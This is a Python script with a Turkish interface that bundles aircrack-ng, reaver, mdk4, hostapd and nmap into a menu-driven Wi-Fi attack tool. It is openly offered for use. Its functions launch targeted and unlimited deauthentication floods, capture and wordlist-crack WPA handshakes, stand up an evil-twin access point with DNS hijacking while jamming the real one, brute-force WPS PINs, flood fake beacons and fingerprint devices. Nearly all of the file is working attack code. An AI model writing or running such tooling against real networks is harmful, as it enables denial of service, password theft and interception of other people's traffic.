#!/usr/bin/env python3

import subprocess
import time
import csv
import os
import re
import json
import random
import string
import threading
from pathlib import Path
import sys
import platform

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import box
from rich.align import Align
from rich.rule import Rule

console = Console()

BANNER = """
██╗    ██╗██╗███████╗██╗    ██╗ █████╗ ██╗   ██╗
██║    ██║██║██╔════╝██║    ██║██╔══██╗╚██╗ ██╔╝
██║ █╗ ██║██║█████╗  ██║ █╗ ██║███████║ ╚████╔╝ 
██║███╗██║██║██╔══╝  ██║███╗██║██╔══██║  ╚██╔╝  
╚███╔███╔╝██║██║     ╚███╔███╔╝██║  ██║   ██║   
 ╚══╝╚══╝ ╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝  
"""

INTERFACE   = "wlan0"
MON_IFACE   = INTERFACE + "mon"
SCAN_DIR    = Path("scan_results")
CSV_PREFIX  = str(SCAN_DIR / "scan_capture")

# ─── UI YARDIMCI ─────────────────────────────────────────────────────────────

def clear_screen():
    os.system("cls" if platform.system() == "Windows" else "clear")

def ensure_scan_dir():
    SCAN_DIR.mkdir(exist_ok=True)

def show_banner():
    clear_screen()
    console.print(Align.center(
        Panel(
            Text(BANNER, style="bold green", justify="center"),
            subtitle="[dim cyan]Wi-Fi Ağ Tarama & Analiz Aracı[/]",
            border_style="green",
            padding=(0, 4),
        )
    ))
    console.print(Rule(style="dim green"))
    console.print()

def status(msg):  console.print(f"  [bold green]›[/] {msg}")
def success(msg): console.print(f"  [bold green]✔[/] [green]{msg}[/]")
def warn(msg):    console.print(f"  [bold yellow]⚠[/]  [yellow]{msg}[/]")
def error(msg):   console.print(f"  [bold red]✘[/] [red]{msg}[/]")
def info(msg):    console.print(f"  [dim]ℹ  {msg}[/]")

def section(title):
    console.print()
    console.print(Rule(f"[bold green] {title} [/]", style="dim green"))
    console.print()

def safe_input(prompt):
    try:
        return Prompt.ask(f"\n  [bold green]›[/] {prompt}")
    except KeyboardInterrupt:
        console.print()
        warn("Ctrl+C algılandı.")
        ans = Prompt.ask("  Çıkmak istiyor musunuz? [bold](e/h)[/]").strip().lower()
        if ans == "e":
            disable_monitor_mode()
            console.print(Panel("[bold red]Çıkış yapıldı.[/]", border_style="red"))
            sys.exit(0)
        info("Devam ediliyor...")
        return ""

# ─── MONITOR MOD ─────────────────────────────────────────────────────────────

def enable_monitor_mode():
    section("Monitor Mod Etkinleştiriliyor")
    status(f"airmon-ng start [bold]{INTERFACE}[/] çalıştırılıyor...")
    subprocess.run(["sudo", "airmon-ng", "start", INTERFACE],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    success(f"Monitor mod etkinleştirildi → [bold cyan]{MON_IFACE}[/]")

def disable_monitor_mode():
    section("Monitor Mod Kapatılıyor")
    status(f"airmon-ng stop [bold]{MON_IFACE}[/] çalıştırılıyor...")
    subprocess.run(["sudo", "airmon-ng", "stop", MON_IFACE],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    success("Monitor mod kapatıldı.")

# ─── XTERM ───────────────────────────────────────────────────────────────────

def run_command_in_xterm(command, title, fg="green"):
    full_cmd = ["xterm", "-bg", "black", "-fg", fg,
                "-fa", "Monospace", "-fs", "11",
                "-title", title,
                "-e", "bash", "-c", f"exec sudo {command}"]
    status(f"[bold]{title}[/] → xterm penceresi açıldı.")
    return subprocess.Popen(full_cmd)

# ─── CSV ─────────────────────────────────────────────────────────────────────

def get_latest_csv(prefix=CSV_PREFIX, timeout=10):
    deadline = time.time() + timeout
    with Progress(SpinnerColumn(style="green"),
                  TextColumn("[cyan]CSV dosyası aranıyor..."),
                  transient=True) as p:
        p.add_task("", total=None)
        while time.time() < deadline:
            files = list(Path(".").glob(f"{prefix}*.csv"))
            if files:
                return max(files, key=os.path.getmtime)
            time.sleep(0.5)
    return None

def parse_csv_aps(csv_file):
    aps = []
    if not csv_file:
        return aps
    with open(csv_file, newline="", encoding="utf-8", errors="replace") as f:
        reader = csv.reader(f)
        for row in reader:
            if not row: continue
            if row[0].strip() == "Station MAC": break
            first_col = row[0].strip()
            if len(first_col.split(":")) == 6 and len(first_col) == 17:
                bssid   = first_col
                channel = row[3].strip() if len(row) > 3 else "N/A"
                power   = row[8].strip() if len(row) > 8 else "N/A"
                enc     = row[5].strip() if len(row) > 5 else "N/A"
                essid   = (",".join(row[13:]).strip().strip('"')
                           if len(row) >= 14 else row[-1].strip().strip('"'))
                if not essid:
                    essid = "<Gizli Ağ>"
                aps.append({"bssid": bssid, "channel": channel,
                            "essid": essid, "power": power, "enc": enc})
    return aps

def get_clients_of_ap(csv_path, ap_bssid):
    clients = []
    if not csv_path or not Path(csv_path).exists():
        return clients
    with open(csv_path, newline="", encoding="utf-8", errors="replace") as f:
        reader = csv.reader(f)
        sec = "aps"
        for row in reader:
            if not row: continue
            if row[0].strip() == "Station MAC":
                sec = "clients"; continue
            if sec == "clients":
                mac = row[0].strip()
                if len(mac.split(":")) != 6: continue
                bssid  = row[5].strip() if len(row) > 5 else "(not associated)"
                probed = ",".join(row[6:]).strip().strip('"') if len(row) > 6 else ""
                clients.append({"mac": mac, "bssid": bssid, "probed": probed})
    return [c for c in clients if c["bssid"] == ap_bssid]

# ─── TABLOLAR ────────────────────────────────────────────────────────────────

def list_aps(aps):
    section("Bulunan Ağlar")
    table = Table(box=box.SIMPLE_HEAVY, border_style="green",
                  header_style="bold green", show_lines=False)
    table.add_column("#",      style="bold yellow", justify="right", width=4)
    table.add_column("BSSID",  style="cyan",        width=19)
    table.add_column("CH",     style="magenta",     justify="center", width=5)
    table.add_column("PWR",    style="yellow",      justify="center", width=6)
    table.add_column("ENC",    style="red",         width=8)
    table.add_column("ESSID",  style="bold white")
    for i, ap in enumerate(aps, 1):
        table.add_row(str(i), ap["bssid"], ap["channel"],
                      ap.get("power","?"), ap.get("enc","?"), ap["essid"])
    console.print(table)

def list_clients(clients):
    section("Bağlı İstemciler")
    table = Table(box=box.SIMPLE_HEAVY, border_style="green",
                  header_style="bold green", show_lines=False)
    table.add_column("#",            style="bold yellow", justify="right", width=4)
    table.add_column("MAC Adresi",   style="cyan",  width=19)
    table.add_column("Probed SSIDs", style="dim white")
    for i, c in enumerate(clients, 1):
        table.add_row(str(i), c["mac"], c["probed"] or "—")
    console.print(table)

# ─── SEÇIM ───────────────────────────────────────────────────────────────────

def select_aps(aps):
    while True:
        sel = Prompt.ask(
            "\n  [bold green]›[/] Ağ numaralarını seçin [dim](virgülle, örn: 1,3)[/]"
        ).strip()
        if not sel:
            warn("İşlem iptal edildi.")
            return []
        try:
            nums     = [int(x.strip()) for x in sel.split(",")]
            selected = [aps[n - 1] for n in nums if 1 <= n <= len(aps)]
            if selected: return selected
            warn("Geçersiz seçim.")
        except (ValueError, IndexError):
            warn("Sadece listeden numara girin.")

# ─── ANA SALDIRI MENÜSÜ ──────────────────────────────────────────────────────

def run_attack_menu(ap, clients):
    section(f"Saldırı & Araçlar Menüsü — {ap['essid']}")

    table = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
    table.add_column(style="bold yellow", width=4)
    table.add_column(style="white")
    table.add_row("1", "Deauth — Belirli istemciye")
    table.add_row("2", "Deauth — Tüm ağa sınırsız")
    table.add_row("3", "Handshake Yakala (WPA/WPA2)")
    table.add_row("4", "Evil Twin — Sahte AP Oluştur")
    table.add_row("5", "WPS PIN Saldırısı (reaver)")
    table.add_row("6", "Beacon Flood — Sahte Ağ Yayını")
    table.add_row("7", "OS Fingerprinting (nmap)")
    table.add_row("0", "Geri dön")
    console.print(table)

    while True:
        choice = safe_input("Seçiminiz").strip()

        if choice == "1":
            _deauth_client(ap, clients)
            break
        elif choice == "2":
            _deauth_all(ap)
            break
        elif choice == "3":
            _handshake_capture(ap, clients)
            break
        elif choice == "4":
            _evil_twin(ap)
            break
        elif choice == "5":
            _wps_attack(ap)
            break
        elif choice == "6":
            _beacon_flood()
            break
        elif choice == "7":
            _os_fingerprint(ap, clients)
            break
        elif choice == "0":
            break
        else:
            warn("Lütfen listeden bir numara girin.")

# ─── 1. DEAUTH — BELİRLİ ─────────────────────────────────────────────────────

def _deauth_client(ap, clients):
    idx = safe_input("İstemci numarası").strip()
    try:
        client = clients[int(idx) - 1]
        count  = safe_input("Paket sayısı").strip()
        cmd    = (f"aireplay-ng --deauth {count} "
                  f"-a {ap['bssid']} -c {client['mac']} {MON_IFACE}")
        success(f"Başlatılıyor: [dim]{cmd}[/]")
        subprocess.Popen(["xterm", "-bg", "black", "-fg", "red",
                          "-title", f"Deauth: {ap['essid']}",
                          "-e", "bash", "-c", f"exec sudo {cmd}"])
    except Exception:
        warn("Geçersiz seçim.")

# ─── 2. DEAUTH — TÜM AĞ ─────────────────────────────────────────────────────

def _deauth_all(ap):
    cmd = f"aireplay-ng -0 0 -a {ap['bssid']} {MON_IFACE}"
    success(f"Tüm ağa saldırı: [dim]{cmd}[/]")
    subprocess.Popen(["xterm", "-bg", "black", "-fg", "red",
                      "-title", f"Deauth (Tüm): {ap['essid']}",
                      "-e", "bash", "-c", f"exec sudo {cmd}"])

# ─── 3. HANDSHAKE YAKALAMA ───────────────────────────────────────────────────

def _handshake_capture(ap, clients):
    section("Handshake Yakalama")
    cap_file = str(SCAN_DIR / f"hs_{ap['bssid'].replace(':','_')}")
    info(f"Yakalanacak dosya: [cyan]{cap_file}-01.cap[/]")

    # Önce hedef ağı dinle
    dump_cmd = (f"airodump-ng --bssid {ap['bssid']} --channel {ap['channel']} "
                f"--output-format pcap --write {cap_file} {MON_IFACE}")
    dump_proc = run_command_in_xterm(dump_cmd, f"Handshake Dinleniyor: {ap['essid']}")

    time.sleep(3)

    # Bir client seçilirse ona deauth gönder (handshake tetiklemek için)
    if clients:
        info(f"{len(clients)} istemci mevcut, deauth ile handshake tetikleniyor...")
        client = clients[0]
        deauth_cmd = (f"aireplay-ng --deauth 5 "
                      f"-a {ap['bssid']} -c {client['mac']} {MON_IFACE}")
        subprocess.Popen(["xterm", "-bg", "black", "-fg", "yellow",
                          "-title", "Handshake Tetikleme",
                          "-e", "bash", "-c", f"exec sudo {deauth_cmd}"])
    else:
        warn("Client bulunamadı; broadcast deauth gönderiliyor...")
        deauth_cmd = f"aireplay-ng --deauth 5 -a {ap['bssid']} {MON_IFACE}"
        subprocess.Popen(["xterm", "-bg", "black", "-fg", "yellow",
                          "-title", "Handshake Tetikleme",
                          "-e", "bash", "-c", f"exec sudo {deauth_cmd}"])

    info("Handshake penceresi açık — yakalandıktan sonra [bold]Enter[/bold]'a basın.")
    try:
        input()
    except KeyboardInterrupt:
        pass
    try:
        dump_proc.terminate()
        dump_proc.wait(timeout=3)
    except Exception:
        dump_proc.kill()

    cap_path = Path(f"{cap_file}-01.cap")
    if cap_path.exists():
        success(f"Handshake dosyası hazır: [cyan]{cap_path}[/]")
        ans = safe_input("aircrack-ng ile wordlist dene? [bold](e/h)[/]").strip().lower()
        if ans == "e":
            wordlist = safe_input("Wordlist dosya yolu [dim](örn: /usr/share/wordlists/rockyou.txt)[/]").strip()
            crack_cmd = f"aircrack-ng {cap_path} -w {wordlist}"
            run_command_in_xterm(crack_cmd, f"Şifre Kırma: {ap['essid']}", fg="yellow")
    else:
        warn("Cap dosyası bulunamadı; handshake yakalanamadı olabilir.")

# ─── 4. EVIL TWIN ────────────────────────────────────────────────────────────

def _evil_twin(ap):
    section("Evil Twin — Sahte AP")
    warn("Bu özellik hostapd + dnsmasq gerektirir.")

    essid   = ap["essid"]
    channel = ap["channel"]

    # hostapd.conf oluştur
    hostapd_conf = f"""\
interface={INTERFACE}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
    conf_path = "/tmp/evil_twin_hostapd.conf"
    with open(conf_path, "w") as f:
        f.write(hostapd_conf)
    success(f"hostapd.conf yazıldı → [dim]{conf_path}[/]")

    # dnsmasq.conf oluştur
    dnsmasq_conf = """\
interface=wlan0
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/192.168.1.1
"""
    dns_path = "/tmp/evil_twin_dnsmasq.conf"
    with open(dns_path, "w") as f:
        f.write(dnsmasq_conf)
    success(f"dnsmasq.conf yazıldı → [dim]{dns_path}[/]")

    info("Orijinal AP deauth ile engelleniyor...")
    deauth_proc = subprocess.Popen(
        ["sudo", "aireplay-ng", "-0", "0", "-a", ap["bssid"], MON_IFACE],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    run_command_in_xterm(f"hostapd {conf_path}", f"Evil Twin AP: {essid}", fg="red")
    run_command_in_xterm(f"dnsmasq -C {dns_path} --no-daemon", "dnsmasq DHCP", fg="yellow")

    info("Evil Twin çalışıyor. Durdurmak için [bold]Enter[/bold]'a basın.")
    try:
        input()
    except KeyboardInterrupt:
        pass
    deauth_proc.terminate()
    success("Evil Twin durduruldu.")

# ─── 5. WPS SALDIRISI ────────────────────────────────────────────────────────

def _wps_attack(ap):
    section("WPS PIN Saldırısı")
    warn("Bu özellik 'reaver' aracını gerektirir.")
    info(f"Hedef: [cyan]{ap['bssid']}[/]  Kanal: [magenta]{ap['channel']}[/]")

    mode = safe_input("1) Normal reaver  2) Pixie Dust saldırısı\nSeçiminiz (1/2)").strip()

    if mode == "2":
        cmd = (f"reaver -i {MON_IFACE} -b {ap['bssid']} "
               f"-c {ap['channel']} -K 1 -vv")
        title = f"WPS Pixie Dust: {ap['essid']}"
    else:
        cmd = (f"reaver -i {MON_IFACE} -b {ap['bssid']} "
               f"-c {ap['channel']} -vv")
        title = f"WPS Brute-force: {ap['essid']}"

    success(f"Başlatılıyor: [dim]{cmd}[/]")
    run_command_in_xterm(cmd, title, fg="yellow")

# ─── 6. BEACON FLOOD ─────────────────────────────────────────────────────────

# Sabit SSID listesi
BUILTIN_SSIDS = [
    "Turkcell_Superbox",
    "TurkTelekom_5G",
    "Vodafone_Ev",
    "TP-Link_2.4GHz",
    "Modem_123",
    "Komsu_wifi",
]

def _beacon_flood():
    section("Beacon Flood — Sahte Ağ Yayını")
    warn("Bu özellik 'mdk4' aracını gerektirir.")

    table = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
    table.add_column(style="bold yellow", width=4)
    table.add_column(style="white")
    table.add_row("1", "Artan isimler (Ev_Wifi_1, Ev_Wifi_2...)")
    table.add_row("2", "Sabit liste (Turkcell, TurkTelekom, Vodafone...)")
    table.add_row("3", "Tamamen rastgele karakterler (xK9mPqR2...)")
    console.print(table)

    mode = safe_input("Seçiminiz (1/2/3)").strip()
    tmp_ssid = "/tmp/beacon_ssids.txt"

    if mode == "1":
        base = safe_input("Temel ağ adı [dim](örn: Ev_Wifi → Ev_Wifi_1, Ev_Wifi_2...)[/]").strip()
        count = safe_input("Kaç adet sahte ağ? [dim](örn: 20)[/]").strip()
        try:
            count = int(count)
        except ValueError:
            count = 20
        with open(tmp_ssid, "w") as f:
            for i in range(1, count + 1):
                f.write(f"{base}_{i}\n")
        success(f"{count} adet SSID oluşturuldu: [cyan]{base}_1[/] → [cyan]{base}_{count}[/]")

    elif mode == "2":
        with open(tmp_ssid, "w") as f:
            for ssid in BUILTIN_SSIDS:
                f.write(ssid + "\n")
        success(f"{len(BUILTIN_SSIDS)} sabit SSID kullanılıyor:")
        for s in BUILTIN_SSIDS:
            info(f"  [cyan]{s}[/]")

    else:
        count = safe_input("Kaç adet rastgele ağ? [dim](örn: 50)[/]").strip()
        try:
            count = int(count)
        except ValueError:
            count = 50
        with open(tmp_ssid, "w") as f:
            for _ in range(count):
                rand = "".join(__import__("random").choices(__import__("string").ascii_letters + __import__("string").digits, k=8))
                f.write(rand + "\n")
        success(f"{count} rastgele SSID oluşturuldu.")

    cmd = f"mdk4 {MON_IFACE} b -f {tmp_ssid}"
    run_command_in_xterm(cmd, "Beacon Flood", fg="red")

# ─── 7. OS FINGERPRINTING ────────────────────────────────────────────────────

def _os_fingerprint(ap, clients):
    section("OS Fingerprinting")
    warn("Bu özellik 'nmap' gerektirir ve managed mod bağlantısı tercih edilir.")

    if not clients:
        ip = safe_input("Hedef IP adresi girin [dim](örn: 192.168.1.0/24)[/]").strip()
    else:
        info("Bağlı istemciler:")
        for i, c in enumerate(clients, 1):
            console.print(f"  [bold yellow]{i}.[/] {c['mac']}")
        ans = safe_input("Taranacak IP / subnet girin [dim](örn: 192.168.1.5)[/]").strip()
        ip  = ans

    cmd   = f"nmap -O --osscan-guess {ip}"
    success(f"Başlatılıyor: [dim]{cmd}[/]")
    run_command_in_xterm(cmd, f"OS Fingerprint: {ip}", fg="cyan")

# ─── TARAMA YARDIMCILARI ─────────────────────────────────────────────────────

def do_network_scan():
    """Ağ taraması yap, AP listesi döndür."""
    section("Ağ Taraması")
    status("Tüm ağlar taranıyor — xterm penceresini [bold]Ctrl+C[/] ile durdurun.")
    cmd  = (f"airodump-ng --write-interval 1 --output-format csv "
            f"--write {CSV_PREFIX} {MON_IFACE}")
    proc = run_command_in_xterm(cmd, "Ağ Taraması — airodump-ng")
    try:
        proc.wait()
    except KeyboardInterrupt:
        warn("Ctrl+C — tarama kapatılıyor...")
        try:   proc.terminate(); proc.wait(timeout=3)
        except Exception: proc.kill(); proc.wait()

    csv_file = get_latest_csv(prefix=CSV_PREFIX, timeout=8)
    if not csv_file:
        error("CSV bulunamadı.")
        return []
    aps = parse_csv_aps(csv_file)
    if not aps:
        warn("Hiç ağ bulunamadı.")
        return []
    list_aps(aps)
    return aps

def do_client_scan(ap):
    """Seçili AP için istemci taraması yap, client listesi döndür."""
    section(f"İstemci Taraması — {ap['essid']}")
    status(f"BSSID: [cyan]{ap['bssid']}[/]  Kanal: [magenta]{ap['channel']}[/]")
    prefix = str(SCAN_DIR / f"{ap['bssid'].replace(':','_')}_client_scan")
    cmd    = (f"airodump-ng --bssid {ap['bssid']} --channel {ap['channel']} "
              f"--output-format csv --write {prefix} {MON_IFACE}")
    cp = run_command_in_xterm(cmd, f"İstemci Taraması: {ap['essid']}")
    try:
        cp.wait()
    except KeyboardInterrupt:
        warn("Ctrl+C — istemci tarama kapatılıyor...")
        try:   cp.terminate(); cp.wait(timeout=3)
        except Exception: cp.kill(); cp.wait()

    client_csv = get_latest_csv(prefix=prefix, timeout=6)
    if not client_csv:
        warn("İstemci CSV bulunamadı.")
        return []
    clients = get_clients_of_ap(client_csv, ap["bssid"])
    if not clients:
        info("Bu ağa bağlı istemci bulunamadı.")
    else:
        success(f"{len(clients)} istemci bulundu.")
        list_clients(clients)
    return clients

# ─── KATEGORİ 1 — AĞ HEDEFLİ SALDIRILAR ────────────────────────────────────

def menu_network_attacks():
    """Tara → ağ seç → istemci tara → saldırı seç."""
    aps = do_network_scan()
    if not aps:
        return

    selected = select_aps(aps)
    if not selected:
        return

    for ap in selected:
        clients = do_client_scan(ap)

        section(f"Saldırı Menüsü — {ap['essid']}")
        table = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
        table.add_column(style="bold yellow", width=4)
        table.add_column(style="white")
        table.add_row("1", "Deauth — Belirli istemciye")
        table.add_row("2", "Deauth — Tüm ağa sınırsız")
        table.add_row("3", "Handshake Yakala (WPA/WPA2)")
        table.add_row("4", "Evil Twin — Sahte AP Oluştur")
        table.add_row("5", "WPS PIN Saldırısı (reaver)")
        table.add_row("0", "Geri dön")
        console.print(table)

        while True:
            choice = safe_input("Seçiminiz").strip()
            if choice == "1":
                _deauth_client(ap, clients); break
            elif choice == "2":
                _deauth_all(ap); break
            elif choice == "3":
                _handshake_capture(ap, clients); break
            elif choice == "4":
                _evil_twin(ap); break
            elif choice == "5":
                _wps_attack(ap); break
            elif choice == "0":
                break
            else:
                warn("Lütfen listeden bir numara girin.")

# ─── KATEGORİ 2 — KEŞİF & ANALİZ ────────────────────────────────────────────

def menu_recon():
    """Ağ tara → seç → analiz aracı seç."""
    section("Keşif & Analiz")
    table = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
    table.add_column(style="bold yellow", width=4)
    table.add_column(style="white")
    table.add_row("1", "OS Fingerprinting — cihaz işletim sistemi tespiti")
    table.add_row("0", "Geri dön")
    console.print(table)

    choice = safe_input("Seçiminiz").strip()
    if choice == "0":
        return

    aps = do_network_scan()
    if not aps:
        return
    selected = select_aps(aps)
    if not selected:
        return

    for ap in selected:
        clients = do_client_scan(ap)
        if choice == "1":
            _os_fingerprint(ap, clients)

# ─── KATEGORİ 3 — AĞ BAĞIMSIZ ARAÇLAR ───────────────────────────────────────

def menu_standalone():
    """Ağ taraması gerektirmeyen araçlar."""
    section("Ağ Bağımsız Araçlar")
    table = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
    table.add_column(style="bold yellow", width=4)
    table.add_column(style="white")
    table.add_row("1", "Beacon Flood — Sahte ağ yayını")
    table.add_row("0", "Geri dön")
    console.print(table)

    choice = safe_input("Seçiminiz").strip()
    if choice == "1":
        _beacon_flood()

# ─── ANA MENÜ ────────────────────────────────────────────────────────────────

def main_menu():
    while True:
        section("Ana Menü")
        table = Table(box=box.ROUNDED, border_style="green", show_header=False)
        table.add_column(style="bold yellow", width=4)
        table.add_column(style="white")
        table.add_row("1", "[bold]Ağ Hedefli Saldırılar[/]  [dim](Deauth, Handshake, Evil Twin, WPS)[/]")
        table.add_row("2", "[bold]Keşif & Analiz[/]          [dim](OS Fingerprinting)[/]")
        table.add_row("3", "[bold]Ağ Bağımsız Araçlar[/]     [dim](Beacon Flood)[/]")
        table.add_row("0", "Çıkış")
        console.print(table)

        choice = safe_input("Seçiminiz").strip()
        if choice == "1":
            menu_network_attacks()
        elif choice == "2":
            menu_recon()
        elif choice == "3":
            menu_standalone()
        elif choice == "0":
            return False
        else:
            warn("Lütfen listeden bir numara girin.")

# ─── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    show_banner()

    if os.geteuid() != 0:
        error("Bu script root yetkisi gerektirir.")
        console.print("  Çalıştırın: [bold cyan]sudo python3 wifi_scanner.py[/]")
        sys.exit(1)

    console.print(Align.center("[dim]Başlamak için [bold]Enter[/bold]'a basın...[/]"))
    try:
        input()
    except KeyboardInterrupt:
        sys.exit(0)

    try:
        ensure_scan_dir()
        success(f"Tarama dosyaları klasörü: [cyan]{SCAN_DIR.resolve()}[/]")
        enable_monitor_mode()

        main_menu()

        disable_monitor_mode()
        console.print()
        console.print(Panel(
            "[bold green]İyi günler![/]\n[dim]Tüm işlemler tamamlandı.[/]",
            border_style="green", padding=(1, 6)
        ))

    except KeyboardInterrupt:
        console.print()
        warn("Ana Ctrl+C algılandı.")
        ans = safe_input("Çıkmak istiyor musunuz? [bold](e/h)[/]").strip().lower()
        if ans == "e":
            disable_monitor_mode()
            console.print(Panel("[bold red]Kapatıldı.[/]", border_style="red"))

    except Exception as e:
        error(f"Beklenmedik hata: {e}")
        try: disable_monitor_mode()
        except Exception: pass
        sys.exit(1)


if __name__ == "__main__":
    main()
